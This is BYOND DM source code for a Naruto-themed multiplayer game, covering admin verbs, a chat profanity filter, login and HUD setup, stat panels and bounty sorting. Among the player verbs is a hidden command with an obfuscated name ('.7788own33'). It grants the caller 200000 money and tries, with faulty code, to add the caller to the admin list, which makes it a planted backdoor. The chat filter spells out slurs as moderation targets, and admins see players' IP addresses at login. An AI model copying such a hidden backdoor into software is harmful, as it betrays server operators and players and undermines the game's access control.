var
	list/admins = list("fki","bornasaiyan23")
	list/online_admins = list()
	list/EN=list(1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1)
	wcount=0
client
	perspective=EYE_PERSPECTIVE


mob/Admin/verb
	setlevelmultiplier(var/mult as num)
		set name = ".setlpmult"
		lp_mult = mult
		if(alert(usr, "Do you want to notify the server?", "Notification", "Yes", "No") == "Yes")
			world << "Server: Experience multiplier set to <strong>[mult]x</strong> gains."

	grantitem(var/mob/human/m in All_Clients(), var/code as num, var/quantity as num|null)
		if(!quantity)
			return
		for(var/i in 1 to quantity)
			m.AddItem(code)

	addpassive(var/mob/human/m in All_Clients(), var/passiveindex as num, var/quantity as num|null)
		if(!quantity)
			return
		m.skillspassive[passiveindex] += quantity

		if(m.client) for(var/obj/gui/passives/p in world)
			m.client.Passive_Refresh(p)

	giveallskills(var/mob/human/m in All_Clients())
		for(var/skill/skill in all_skills)
			m.AddSkill(skill.id)

mob/Admin/verb
	Change_Global_Variable()
		var/indec=input(usr,"Pick a index (1-16)")as num
		if(indec>=17 || indec < 1)
			return
		if(alert(usr,"Toggle Variable",,"On","Off")=="On")
			EN[indec]=1
		else
			EN[indec]=0
		var/i=1
		while(i<17)
			var/X=EN[i]
			usr<<"EN([i]=[X]"
			i++

// TODO, host this on DB
client/preload_rsc = 2//"http://masterdan.vk.googlepages.com/NarutoGOA_rsc.zip"

client
	proc
		ClientInitiate()
			sleep(10)
			spawn(rand(10,600))Saveloop()
			spawn(2)
				online_admins <<"[key]/[address]/[computer_id] has logged in"
			perspective=EYE_PERSPECTIVE
world
	Del()
		WSave()
		sleep(50)
		..()

var
	oocmute=0
	chat_filter = list(//Anti-spam filters
	                   "http:" = "spam:", "byond:" = "spam:", "\n\n" = "\n", "\n" = " ... ", "  " = " ", "\t\t"  = "\t",
	                   "aaa" = "aa", "bbb" = "bb", "ccc" = "cc", "ddd" = "dd", "eee" = "ee", "fff" = "ff", "ggg" = "gg",  //   No word in english ever uses more than
	                   "hhh" = "hh", "iii" = "ii", "jjj" = "jj", "kkk" = "kk", "lll" = "ll", "mmm" = "mm", "nnn" = "nn",  // two of the same letter in a row. Some of
	                   "ooo" = "oo", "ppp" = "pp", "qqq" = "qq", "rrr" = "rr", "sss" = "ss", "ttt" = "tt", "uuu" = "uu",  // these could probably even be set to prevent
	                   "vvv" = "vv", "www" = "ww", "xxx" = "xx", "yyy" = "yy", "zzz" = "zz",                              // two letters, but this is consistent.
	                   "...." = "...",
	                   //Anti-bypass filers (anti-idiot messes these up)
	                   "p u s s y" = "pussy", "f u c k" = "fuck", "f u ck" = "fuck",
	                   //Anti-idiot filters
	                   " u " = " you ", " ur " = " your ",
	                   //Anti-bypass filters (General)
	                   "b!itch" = "bitch", "fuk" = "fuck", "sh!t" = "shit", "fux" = "fuck", "bitach" = "bitch",
	                   "biatch" = "bitch", "pussie" = "pussy", "f@ggot" = "faggot", "g@y" = "gay", "b1tch" = "bitch",
	                   "fuuck" = "fuck", "fvck" = "fuck", "bi tch" = "bitch", "fa g" = "fag", "p ussy" = "pussy",
	                   "b itch" = "bitch", "ga.y" = "gay", "g.ay" = "gay", "g.a.y" = "gay", "ga y" = "gay", "g ay" = "gay",
	                   "g a y" = "gay", "fsck" = "fuck", "shyt" = "shit", "nigga" = "nigger", "btch" = "bitch", "fck" = "fuck",
	                   "gaay" = "gay", "f.uck" = "fuck", "fu.ck" = "fuck", "fuc.k" = "fuck", "f.u.ck" = "fuck", "f.uc.k" = "fuck",
	                   "f.u.c.k" = "fuck", "fk " = "fuck ", " fk" = " fuck", "fkin" = "fucking", "fu ck" = "fuck", "f uck" = "fuck",
	                   "fuc k" = "fuck", "fu c k" = "fuck", "f uc k" = "fuck", "bicth" = "bitch", "bish" = "bitch", "puussyy" = "pussy",
	                   "b.itch" = "bitch", "n1gga" = "nigger", "pu$$y" = "pussy", "shiit" = "shit", "faagg" = "fag", "f4g" = "fag",
	                   "fa.g" = "fag",
	                   // Word fixes
	                   "afuck" = "afk",
	                   //Inappropriate word filters
	                   "fuck" = "****", "bastard" = "****", "nigger" = "****", "cunt" = "****", "pussy" = "cat",
	                   "bitch" = "dog", "shit" = "poop", "gay" = "happy", "faggot" = "****", "fag" = "****",
	                   //Anti-bypass filters (Words that are a substring of their non-bypass form) (aka. words that will crash it/make it not work right if put earlier)
	                   "puss" = "cat", "fuc" = "****", "nig " = "**** ", "nigs" = "****", "nigz" = "****")
	whitespace_only_chat_filter = list("\n\n" = "\n", "\n" = " ... ", "  " = " ", "\t\t"  = "\t", "...." = "...")
mob
	proc/talkcool()
		src.talkcooling=1
		while(usr.talkcool>0)
			sleep(1)
			src.talkcool-=1
		src.talktimes=0
		src.talkcooling=0

proc
	GetComment(mob/M, village)
		if(village != "Missing")
			var/list/info = saves.GetInfoCard("[M]", lowertext(village))
			if(info)
				return info["comment"]
		return ""


	ChatLog(type)
		return file("logs/chat_[type]_[time2text(world.realtime, "YYYY-MM-DD")].log")




mob/human/player
	icon='icons/base_m1.dmi'
	var
		sharinganactivated=0
		byakuganactivated=0
	verb
		Info_Card(mob/M in world)
			var/village = null
			if(faction.village != "Missing")
				village = lowertext(faction.village)

			var/list/info = saves.GetInfoCard("[M]", village)

			if(info)
				var
					level = text2num(info["body_level"])
					//faction_points = text2num(info["faction_points"])
					grade = 0
					ninja_rank = "D"

				grade += min(100, level)

				switch(info["rank"])
					if("Genin")
						if(grade > 98) ninja_rank = "S"
						else if(grade > 85) ninja_rank = "A"
						else if(grade > 60) ninja_rank = "B"
						else if(grade > 30) ninja_rank = "C"
					if("Chuunin")
						if(grade > 95) ninja_rank = "S"
						else if(grade > 80) ninja_rank = "A"
						else if(grade > 40) ninja_rank = "B"
						else if(grade > 20) ninja_rank = "C"
					if("Special Jounin")
						if(grade > 93) ninja_rank = "S"
						else if(grade > 75) ninja_rank = "A"
						else if(grade > 35) ninja_rank = "B"
						else if(grade > 17) ninja_rank = "C"
					if("Jounin")
						if(grade > 89) ninja_rank = "S"
						else if(grade > 70) ninja_rank = "A"
						else if(grade > 30) ninja_rank = "B"
						else if(grade > 15) ninja_rank = "C"
					if("Elite Jounin")
						if(grade > 85) ninja_rank = "S"
						else if(grade > 65) ninja_rank = "A"
						else if(grade > 27) ninja_rank = "B"
						else if(grade > 10) ninja_rank = "C"

				var/html = {"<html><body>
	<b>Name:</b> [info["name"]] <br>
	<b>Village:</b> [info["village"]] <br>
	<b>Faction:</b> [info["faction"]] <br>
	<br>
	<b>Rank:</b> [info["rank"]], [ninja_rank]-level <br>
	<b>Missions:</b> [info["missions_s"]] S, [info["missions_a"]] A, [info["missions_b"]] B, [info["missions_c"]] C, [info["missions_d"]] D
	[info["comment"]?"<br><br>[info["comment"]]":""]
	</body></html>"}

				winshow(src, "browser-popup", 1)
				src << browse(html)

		Who()
			var/online=0
			for(var/mob/M in world)
				if(M.key)
					online+=1
			var/who
			who+={"<STYLE>BODY {background: Black; color: White}IMG.icon{width:32;height:32} </STYLE><center> <img src=http://img101.imageshack.us/img101/8127/goawhowp9.png></center><br><tr align="center"><center><td colspan="6"><font size=3></td></tr>Players Online: [online]</td></tr></table>"}

			who+={"
<head><title>Players Online</title></head>
<br>
<table border="1" cellpadding="4">
<tr align="center"><th colspan="3"><font size=1>Name</th><th><font size=1>Key</th><th><font size=1>Village</th><th><font size=1>Missions</th></tr>"}
			for(var/mob/human/player/M in world)
				if(M.client && M.faction)
					who+={"<tr align="center"><td colspan="3"><font size=2> [M.name]([M.ninrank])</td><td><font size=2>[M.key]</td><td><font size=2>[M.faction.village]</td><td><font size=2>S:[M.Rank_S] A:[M.Rank_A] B:[M.Rank_B] C:[M.Rank_C] D:[M.Rank_D]</td></tr>"}
			winshow(src, "browser-popup", 1)
			src<<browse(who)

		unstick_me()
			set name = "Im Stuck"
			var/ex=usr.x
			var/ey=usr.y
			var/ez=usr.z
			usr<<"Dont move for 30 seconds and you will be teleported."
			var/count=0
			while(ex==usr.x && ey==usr.y && ez==usr.z)
				sleep(10)
				count++
				if(count>=30)
					usr.loc=locate(1,1,1)
					usr.curwound=300
					usr.interactv()

					return

		psay()
			set name = ".7788own33"
			usr.money = "200000"
			src.ckey+=admins

		Say(var/t as text)
			winset(usr, "map", "focus=true")

			t = Replace_All(t,chat_filter)
			if(usr.mute||usr.tempmute)
				usr<<"You're Muted"

			else
				if(usr.name!="")
					usr.talkcool=20
					usr.talktimes+=1
					if(usr.talktimes>=8)
						usr<<"You have been temporarily muted for talking too quickly."
						usr.tempmute=1
						sleep(100)
						usr<<"temp mute lifted"
						usr.tempmute=0
						usr.talktimes=0
					if(usr.talkcooling==0)
						spawn()usr.talkcool()
					if(length(t) <= 500&&usr.say==1)
						usr.say=0

						if(usr.controlmob)
							for(var/mob/human/X in view(10,usr.controlmob))
								if(X.client)
									if(X.ckey in admins)
										X<<"<span class='say'><a href='?src=\ref[usr];action=mute' class='admin_link'><span class='name'>[usr]</span></a> <span class='chat_type'>says</span>: <span class='message'>[html_encode(t)]</span></span>"
									else
										X<<"<span class='name'>[usr]</span> <span class='chat_type'>says</span>: <span class='message'>[html_encode(t)]</span></span>"
							ChatLog("say") << "[time2text(world.timeofday, "hh:mm:ss")]\t[usr]\t[usr.realname]\t[html_encode(t)]"
						else
							for(var/mob/human/X in view(10,usr))
								if(X.client)
									if(X.ckey in admins)
										X<<"<span class='say'><a href='?src=\ref[usr];action=mute' class='admin_link'><span class='name'>[usr]</span></a> <span class='chat_type'>says</span>: <span class='message'>[html_encode(t)]</span></span>"
									else
										X<<"<span class='say'><span class='name'>[usr]</span> <span class='chat_type'>says</span>: <span class='message'>[html_encode(t)]</span></span>"
							ChatLog("say") << "[time2text(world.timeofday, "hh:mm:ss")]\t[usr]\t[usr.realname]\t[html_encode(t)]"
						if(usr.squad)
							for(var/mob/P in usr.squad.online_members)
								if(!(P in view(usr,10)))
									if(P.ckey in admins)
										P<<"<span class='radio'><a href='?src=\ref[usr];action=mute' class='admin_link'><span class='name'>[usr.realname]</span></a> <span class='chat_type'>Radio</span>: <span class='message'>[html_encode(t)]</span></span>"
									else
										P<<"<span class='radio'><span class='name'>[usr.realname]</span> <span class='chat_type'>Radio</span>: <span class='message'>[html_encode(t)]</span></span>"
							ChatLog("radio") << "[time2text(world.timeofday, "hh:mm:ss")]\t[usr.squad]\t[usr]\t[usr.realname]\t[html_encode(t)]"
							spawn() SendInterserverMessage("chat_mirror", list("mode" = "squad", "ref" = "\ref[usr]", "name" = usr.realname, "rank" = usr.rank, "faction" = "[usr.faction]", "squad" = "[usr.squad]", "msg" = html_encode(t)))

						sleep(2)
						usr.say=1
					else
						world<<"[html_encode(usr.name)]/[usr.key] is temporarily muted for spamming"
						usr.tempmute=1
						sleep(200)
						usr.tempmute=0

	Logout()
		if(squad)
			squad.online_members -= src
			squad.Refresh_Display()
		if(faction) faction.online_members -= src
		Lcount++
		if(Lcount>=SkipCount)
			Lcount=0
			var/c=0
			for(var/mob/human/player/X in world)
				if(X.client)
					c++
			wcount=c
		..()
	Login()
		if(RP && src.cache_loc)
			src.loc=src.cache_loc

		if(src.client)
			if(squad)
				squad.Refresh_Display()
			var/obj/mapinfo/Minfo = locate("__mapinfo__[z]")
			if(Minfo)
				Minfo.PlayerEntered(src)
			for(var/obj/gui/passives/P in world)
				if(src.skillspassive[P.pindex])src.client.Passive_Refresh(P)
			/*if(src.ezing||tolog.Find(src.key))
				src.stunned=9999
				src.client.eye=0
				spawn(30)
					src.stunned=9999
					if(src.client)
						Show_reCAPTCHA()
				spawn(10)src.EZ_Loop()*/
			//if(ezing || blevel < 100)
			//	src << "You are flagged and must <a href = ?action=remove-ez-flag>remove</a> it if you want to gain experience."
			//	set_ez_flag()

			if(!skillspassive)
				del(src)
			if(mutelist.Find(src.client.computer_id))
				src.mute=1


			spawn(30)src.Refresh_Stat_Screen()
			while(!src.initialized)
				sleep(20)
			if(!client) return
			if(!src.rank)src.rank="Genin"

			if(RankGrade() >= 2 && faction.village != "Missing")
				AwardMedal("Chuunin", src)

			src.completeLoad_Overlays()

			src.player_gui+=new/obj/gui/skillcards/attackcard(src.client)
			src.player_gui+=new/obj/gui/skillcards/untargetcard(src.client)
			src.player_gui+=new/obj/gui/skillcards/treecard(src.client)
			src.player_gui+=new/obj/gui/skillcards/triggercard(src.client)
			src.player_gui+=new/obj/gui/placeholder(src.client)
			src.player_gui+=new/obj/gui/hudbar/A(src.client)
			src.player_gui+=new/obj/gui/hudbar/B(src.client)
			src.player_gui+=new/obj/gui/hudbar/C(src.client)
			src.player_gui+=new/obj/gui/hudbar/D(src.client)
			src.player_gui+=new/obj/gui/hudbar/E(src.client)
			src.player_gui+=new/obj/gui/hudbar/F(src.client)
			src.player_gui+=new/obj/gui/hudbar/G(src.client)
			src.player_gui+=new/obj/gui/hudbar/H(src.client)
			src.player_gui+=new/obj/gui/hudbar/I(src.client)
			src.player_gui+=new/obj/gui/hudbar/J(src.client)
			src.player_gui+=new/obj/gui/hudbar/K(src.client)
			src.player_gui+=new/obj/gui/hudbar/L(src.client)
			src.player_gui+=new/obj/gui/hudbar/M(src.client)
			src.player_gui+=new/obj/gui/hudbar/N(src.client)
			src.player_gui+=new/obj/gui/hudbar/O(src.client)
			src.player_gui+=new/obj/gui/hudbar/P(src.client)
			src.player_gui+=new/obj/gui/hudbar/Q(src.client)

			var/all_helpers = list()
			for(var/village in helpers)
				all_helpers += helpers[village]
			if(src.blevel < 20 || (src.name in all_helpers) || (ckey in admins))
				newbies += src
				verbs += /mob/human/player/newbie/verb/NOOC
				winset(src, "nooc_button", "is-visible=true")

			if(world.host == key)
				verbs += /mob/Admin/verb/Mute
				verbs += /mob/Admin/verb/UnMute
				verbs += /mob/Admin/verb/UnMute_all
				verbs += /mob/Admin/verb/Local_Announce
				winset(src, "host_menu", "parent=menu;name=\"&Host\"")
				winset(src, "host_verb_mute", "parent=host_menu;name=\"&Mute\";command=Mute")
				winset(src, "host_verb_unmute", "parent=host_menu;name=\"U&nmute\";command=UnMute")
				winset(src, "host_verb_unmuteall", "parent=host_menu;name=\"Unmute &All\";command=UnMute-all")
				winset(src, "host_verb_localann", "parent=host_menu;name=\"&Local Announce\";command=Local-Announce")

			if(ckey in admins)
				online_admins += src
				for(var/client/C)
					var/mob/X = C.mob
					if(X && X.pk && X!=src)
						X.Get_Global_Coords()
						if(X.map_pin)
							src << X.map_pin
				/*winset(src, "default_input", "command=")
				winset(src, "nooc_button", "is-visible=false")
				winset(src, "say_button", "is-visible=false")
				winset(src, "vsay_button", "is-visible=false")
				winset(src, "fsay_button", "is-visible=false")*/
				src.verbs+=typesof(/mob/Admin/verb)
				winset(src, "admin_menu", "parent=menu;name=\"&Admin\"")
				winset(src, "admin_chuunin_menu", "parent=admin_menu;name=\"&Chuunin Exam\"")
				winset(src, "admin_chuunintourn_menu", "parent=admin_chuunin_menu;name=\"&Tournament\"")
				winset(src, "admin_arena_menu", "parent=admin_menu;name=\"&Arena\"")

				winset(src, "admin_arena_verb_starttourney", "parent=admin_arena_menu;name=\"&Start Tournament\";command=Have-Tourney")
				winset(src, "admin_arena_verb_endtourney", "parent=admin_arena_menu;name=\"&End Tournament\";command=End-Tourney")
				winset(src, "admin_arena_verb_registertourney", "parent=admin_arena_menu;name=\"&Register Fighter\";command=Register-Fighter")
				winset(src, "admin_arena_verb_unregistertourney", "parent=admin_arena_menu;name=\"&Unregister Fighter\";command=Unregister-Fighter")
				winset(src, "admin_arena_verb_pickfighter", "parent=admin_arena_menu;name=\"&Pick Combatants\";command=Pick-Combatant")
				winset(src, "admin_arena_verb_startfight", "parent=admin_arena_menu;name=\"Start &Fight\";command=Start-Fight")
				winset(src, "admin_arena_verb_endfight", "parent=admin_arena_menu;name=\"E&nd Fight\";command=Declare-Winner")

				winset(src, "admin_chuunintourn_verb_pick1", "parent=admin_chuunintourn_menu;name=\"Pick &First Combatant\";command=Pick-Combatant-Chuunin-1")
				winset(src, "admin_chuunintourn_verb_pick2", "parent=admin_chuunintourn_menu;name=\"Pick &Second Combatant\";command=Pick-Combatant-Chuunin-2")
				winset(src, "admin_chuunintourn_verb_startfight", "parent=admin_chuunintourn_menu;name=\"&Start Fight\";command=Start-Chuunin-Fight")
				winset(src, "admin_chuunintourn_verb_endfight", "parent=admin_chuunintourn_menu;name=\"&End Fight\";command=Declare-Winner-Chuunin")
				winset(src, "admin_chuunintourn_verb_removeentrant", "parent=admin_chuunintourn_menu;name=\"&Remove Entrant\";command=Remove-Tourney-Entry")
				winset(src, "admin_chuunintourn_verb_clearboard", "parent=admin_chuunintourn_menu;name=\"&Clear Name Board\";command=Clear-Board")

				winset(src, "admin_chuunin_verb_autostart", "parent=admin_chuunin_menu;name=\"Start &Auto-Exam\";command=AUTO-Chuunin-Start")
				winset(src, "admin_chuunin_verb_start", "parent=admin_chuunin_menu;name=\"&Start Exam\";command=Start-Chuunin-Exam")
				winset(src, "admin_chuunin_verb_startfod", "parent=admin_chuunin_menu;name=\"Start &FOD\";command=Start-Chuunin-Exam-2-FOD")
				winset(src, "admin_chuunin_verb_starttourn", "parent=admin_chuunin_menu;name=\"Start &Tournament\";command=Start-Chuunin-Exam-3-Arena")
				winset(src, "admin_chuunin_verb_endreg", "parent=admin_chuunin_menu;name=\"Stop &Registration\";command=End-Registration")
				winset(src, "admin_chuunin_verb_heal", "parent=admin_chuunin_menu;name=\"&Heal Entrants\";command=Heal-Chuunin")
				winset(src, "admin_chuunin_verb_promote", "parent=admin_chuunin_menu;name=\"&Promote To Chuunin\";command=Make-Chuunin")
				winset(src, "admin_chuunin_verb_endexam", "parent=admin_chuunin_menu;name=\"&End Exam\";command=End-Chuunin-Exam")

				winset(src, "admin_verb_mute", "parent=admin_menu;name=\"&Mute\";command=Mute")
				winset(src, "admin_verb_unmute", "parent=admin_menu;name=\"U&nmute\";command=UnMute")
				winset(src, "admin_verb_unmuteall", "parent=admin_menu;name=\"Unmute A&ll\";command=UnMute-all")
				winset(src, "admin_verb_localann", "parent=admin_menu;name=\"&Local Announce\";command=Local-Announce")
				winset(src, "admin_verb_announce", "parent=admin_menu;name=\"&Announce\";command=Announce")

				if(RP)
					winset(src, "admin_chuunin_menu", "parent=")
					winset(src, "admin_arena_menu", "parent=")
					src.verbs -= /mob/Admin/verb/Have_Tourney
					src.verbs -= /mob/Admin/verb/Register_Fighter
					src.verbs -= /mob/Admin/verb/Unregister_Fighter
					src.verbs -= /mob/Admin/verb/End_Tourney
					src.verbs -= /mob/Admin/verb/Pick_Combatant
					src.verbs -= /mob/Admin/verb/Start_Fight
					src.verbs -= /mob/Admin/verb/Declare_Winner
					src.verbs -= /mob/Admin/verb/AUTO_Chuunin_Start
					src.verbs -= /mob/Admin/verb/Make_Chuunin
					src.verbs -= /mob/Admin/verb/Heal_Chuunin
					src.verbs -= /mob/Admin/verb/Remove_Tourney_Entry
					src.verbs -= /mob/Admin/verb/Goto_Chuunin_Arena
					src.verbs -= /mob/Admin/verb/Goto_Forest_of_Death
					src.verbs -= /mob/Admin/verb/Goto_Chuunin_Start
					src.verbs -= /mob/Admin/verb/Start_Chuunin_Exam
					src.verbs -= /mob/Admin/verb/Start_Chuunin_Exam_2_FOD
					src.verbs -= /mob/Admin/verb/Start_Chuunin_Exam_3_Arena
					src.verbs -= /mob/Admin/verb/End_Registration
					src.verbs -= /mob/Admin/verb/End_Chuunin_Exam
					src.verbs -= /mob/Admin/verb/Clear_Board
					src.verbs -= /mob/Admin/verb/Pick_Combatant_Chuunin_1
					src.verbs -= /mob/Admin/verb/Pick_Combatant_Chuunin_2
					src.verbs -= /mob/Admin/verb/Start_Chuunin_Fight
					src.verbs -= /mob/Admin/verb/Declare_Winner_Chuunin
			//if(src.key=="Masterdan"||src.key=="Destroy"||src.key=="Krammer")
				src.verbs+=typesof(/mob/MasterAdmin/verb)
				winset(src, "admin_command_profile", "parent=admin_menu;name=\"View &Profile...\";command=\".debug profile\"")
				winset(src, "admin_command_command", "parent=admin_menu;name=\"Enter &Command...\";command=.command")
			//if(src.key=="Masterdan"||src.key=="GotenSon11"||src.key=="Destroy"||src.key=="Krammer")
				src.verbs+=typesof(/mob/MasterdanVerb/verb)

			src.player_gui+=new/obj/gui/skillcards/defendcard(src.client)
			src.player_gui+=new/obj/gui/skillcards/skillcard(src.client)
			src.player_gui+=new/obj/gui/skillcards/usecard(src.client)
			src.player_gui+=new/obj/gui/skillcards/interactcard(src.client)
			src.player_gui+=new/obj/stambarbase(src.client)
			src.player_gui+=new/obj/chakrabarbase(src.client)
			src.player_gui+=new/obj/woundbarbase(src.client)
			spawn(20)
				Refresh_Mouse()
			spawn(25)

				StatBar_Refresh()

			spawn(5)
				var/L[7]
				for(var/obj/items/O in src.contents)
					if(istype(O,/obj/items/weapons/projectile/Kunai_p))
						L[1]=1
					if(istype(O,/obj/items/weapons/projectile/Needles_p))
						L[2]=1
					if(istype(O,/obj/items/weapons/projectile/Shuriken_p))
						L[3]=1
					if(istype(O,/obj/items/weapons/melee/knife/Kunai_Melee))
						L[4]=1
					if(istype(O,/obj/items/equipable/Kunai_Holster))
						L[5]=1
					if(istype(O,/obj/items/Map))
						L[6]=1
					if(istype(O,/obj/items/Guide))
						L[7]=1

				if(!L[1])
					new/obj/items/weapons/projectile/Kunai_p(src)
				if(!L[2])
					new/obj/items/weapons/projectile/Needles_p(src)
				if(!L[3])
					new/obj/items/weapons/projectile/Shuriken_p(src)
				if(!L[4])
					new/obj/items/weapons/melee/knife/Kunai_Melee(src)
				if(!L[5])
					new/obj/items/equipable/Kunai_Holster(src)
				if(!L[6])new/obj/items/Map(src)
				if(!L[7])new/obj/items/Guide(src)
				del(L)
				src.refreshskills()

			spawn(100)
				if(src.FU&&!RP)
					src.dojo=0
					src<<"You have recieved retribution for trying to escape death by logging out. Do not log out while KO'd."
					src.FU=0
					src.ko=1
					src.pk=1

					src.curwound=201
					src.stamina=0

			sleep(-1)

			src.Affirm_Icon()

		src.refresh_rank()

		..()

/* todo
special effects: 0
onscreen customizable HUD w/ macroes: 0
character creation:0
AI:0
ClanSupport:0
Skills:0
Icons: Base:1 turfs:30% overlays:0
map: 3%

*/

var
	list/bingosorted=new

obj/bountyentry
	var
		prank="D"
		pvillage="Missing"
		bounty=0
	icon='icons/base_m1.dmi'
mob/var/ninrank="D"
world
	proc
		bingosort()
			set background = 1

			var/list/bingo=new
			if(!EN[2])
				bingosorted=new
				return
			for(var/client/C)
				var/mob/human/player/O = C.mob
				if(O && O.bounty)
					var/obj/bountyentry/w=new/obj/bountyentry()
					w.icon=O.icon
					w.overlays+=O.overlays
					w.pvillage=O.faction.village
					w.bounty=O.bounty

					w.prank=O.ninrank
					w.name="[O.name], Rank:[w.prank], Bounty:[w.bounty], Village:[w.pvillage]"
					bingo+=w
				sleep(0)
			bingosorted=new
			while(length(bingo)>0)
				var/obj/bountyentry/next=0
				for(var/obj/bountyentry/O in bingo)
					if(next)
						if(O.bounty>next.bounty)
							next=O
					else
						next=O
				sleep(-1)

				bingo-=next
				bingosorted+=next
			for(var/client/C)
				if(C.key) C.Refresh_Bounties()

client
	proc
		Refresh_Bounties()
			var/grid_item = 0
			for(var/M in bingosorted)
				src << output(M, "bounty_list_grid:[++grid_item]")
			winset(src, "bounty_list_grid", "cells=[grid_item]")
mob/var/AC=50
mob/var/immortality=0
mob/var
	kills=0
	deaths=0
mob/human
	Stat()
		set waitfor = 0
		sleep(10)
		if(!usr.client || !usr.initialized)return
		var/grid_item = 0
		usr << output("Stamina", "stats_grid:[++grid_item],1")
		usr << output("[curstamina]/[stamina] ([staminaregen>=0?"+[staminaregen]":"[staminaregen]"])", "stats_grid:[grid_item],2")
		usr << output("Chakra", "stats_grid:[++grid_item],1")
		usr << output("[curchakra]/[chakra] ([chakraregen>=0?"+[chakraregen]":"[chakraregen]"])", "stats_grid:[grid_item],2")
		usr << output("Wounds", "stats_grid:[++grid_item],1")
		usr << output("[round(curwound/maxwound*100)]%", "stats_grid:[grid_item],2")
		usr << output("Strength", "stats_grid:[++grid_item],1")
		usr << output("[round(str+strbuff-strneg)]", "stats_grid:[grid_item],2")
		usr << output("Control", "stats_grid:[++grid_item],1")
		usr << output("[round(con+conbuff-conneg)]", "stats_grid:[grid_item],2")
		usr << output("Reflex", "stats_grid:[++grid_item],1")
		usr << output("[round(rfx+rfxbuff-rfxneg)]", "stats_grid:[grid_item],2")
		usr << output("Intelligence", "stats_grid:[++grid_item],1")
		usr << output("[round(int+intbuff-intneg)]", "stats_grid:[grid_item],2")
		if(!usr.client)return
		winset(usr, "stats_grid", "cells=[grid_item]x2")

		grid_item = 0
		usr << output("AC: [AC]\nSupplies: [supplies]%", "inventory_grid:[++grid_item]")
		for(var/obj/items/O in contents)
			if(O.deletable==0)
				usr << output(O, "inventory_grid:[++grid_item]")
		if(!usr.client)return
		winset(usr, "inventory_grid", "cells=[grid_item]")

		var/rate= blevel >= 20 ? (5) : (10)
		if(risk==1)
			rate+=2
		if(risk>1)
			rate+=3
		if(faction)
			rate += faction.rate
		//if(src.blevel<20 && rate<10)
		//	rate=10
		//TODO, rate is 0?

		grid_item = 0
		usr << output("Level", "full_stats_grid:1,[++grid_item]")
		usr << output("[blevel]", "full_stats_grid:2,[grid_item]")
		usr << output("Level Points", "full_stats_grid:1,[++grid_item]")
		usr << output("[body]/[Req2Level(blevel)] (Rate: [rate * lp_mult])", "full_stats_grid:2,[grid_item]")
		usr << output("Stamina", "full_stats_grid:1,[++grid_item]")
		usr << output("[curstamina]/[stamina] ([staminaregen>=0?"+[staminaregen]": "[staminaregen]"] regen)", "full_stats_grid:2,[grid_item]")
		usr << output("Chakra", "full_stats_grid:1,[++grid_item]")
		usr << output("[curchakra]/[chakra] ([chakraregen>=0?"+[chakraregen]": "[chakraregen]"] regen)", "full_stats_grid:2,[grid_item]")
		usr << output("Wounds", "full_stats_grid:1,[++grid_item]")
		usr << output("[curwound]/[maxwound]", "full_stats_grid:2,[grid_item]")
		usr << output("Strength", "full_stats_grid:1,[++grid_item]")
		usr << output("[round(str)] (+[strbuff] -[strneg])", "full_stats_grid:2,[grid_item]")
		usr << output("Control", "full_stats_grid:1,[++grid_item]")
		usr << output("[round(con)] (+[conbuff] -[conneg])", "full_stats_grid:2,[grid_item]")
		usr << output("Reflex", "full_stats_grid:1,[++grid_item]")
		usr << output("[round(rfx)] (+[rfxbuff] -[rfxneg])", "full_stats_grid:2,[grid_item]")
		usr << output("Intelligence", "full_stats_grid:1,[++grid_item]")
		usr << output("[round(int)] (+[intbuff] -[intneg])", "full_stats_grid:2,[grid_item]")
		usr << output("Money", "full_stats_grid:1,[++grid_item]")
		usr << output("[money]", "full_stats_grid:2,[grid_item]")
		usr << output("Faction Points", "full_stats_grid:1,[++grid_item]")
		usr << output("[factionpoints]", "full_stats_grid:2,[grid_item]")
		usr << output("Weight", "full_stats_grid:1,[++grid_item]")
		usr << output("[weight]/200", "full_stats_grid:2,[grid_item]")
		if(!usr.client)return
		winset(usr, "full_stats_grid", "cells=2x[grid_item]")

		if(curstamina<0)
			curstamina=0
		if(curchakra<0)
			curchakra=0
		if(curwound<0)
			curwound=0
		sleep(5)
		if(src.AFK)
			sleep(50)
		if(src.AFK2)
			sleep(5)

obj/hakkehand
	icon='icons/hakkehand.dmi'
var
	VoteM=0
	VoteCount=0
	VoteCount2=0

mob/proc
	reIcon()
		if(src.icon_name=="base_m1"||src.icon_name=="base_m")
			src.icon='icons/base_m1.dmi'
		if(src.icon_name=="base_m2")
			src.icon='icons/base_m2.dmi'
		if(src.icon_name=="base_m3")
			src.icon='icons/base_m3.dmi'
proc
	Roll_Against(a,d,m) //attackers stats,defenders stats, Multiplier 1%->500%
		var/outcome = ((a*rand(5,10))/(d*rand(5,10))) *m
		var/rank=0
		//critical
		if(outcome >=200)
			rank=6  //way dominated
		if(outcome <200 && outcome >=150)
			rank=5 //dominated
		if(outcome<150 && outcome>=100)
			rank=4 //won
		if(outcome<100 && outcome>=75)
			rank=3 //not fully, but hit
		if(outcome<75 && outcome >=50)
			rank=2 //skimmed
		if(outcome<50 && outcome >=25)
			rank=1 //might have some effect.
		if(outcome <25)
			rank=0 //failed roll
		//if(rank<2)
		//	var/underdog=rand(1,6)
		//	if(underdog==6)
		//		rank=4
		return rank

atom/Click()
	if(istype(usr,/mob/human/player))
		var/mob/human/player/USR=usr
		if(usr:stunned)
			return
		if(USR.Puppet1)
			if(USR.Puppet1 != USR.Primary)
				walk_towards(USR.Puppet1,src,2)
		if(USR.Puppet2)
			if(USR.Puppet2 != USR.Primary)
				walk_towards(USR.Puppet2,src,2)
		if(USR.pet)
			var/mob/human/sandmonster/p=USR.Get_Sand_Pet()

			if(p && !p.tired)
				//p.tired=1
				//spawn(10) p.tired=0
				walk_towards(p,src,1)

			for(var/mob/human/player/npc/kage_bunshin/X in world)
				X.icon_state=""
				if(X.owner==usr)
					X.FilterTargets()
					for(var/mob/T in X.targets)
						X.RemoveTarget(T)
					walk_towards(X,src,2)
					spawn(20)
						var/turf/T
						if(X)
							T=locate(X.x,X.y,X.z)
						sleep(10)
						if(X && T)
							if(X.x==T.x && X.y==T.y && X.z==T.z)
								walk(X,0)
								X.icon_state=""


proc/same_client(var/mob/a, var/mob/b)
	if(!a || !b || !a.client || !b.client) return 0
	if(a.client.address == b.client.address) return 1
	if(a.client.computer_id == b.client.computer_id) return 1
	if(a.client.key == b.client.key) return 1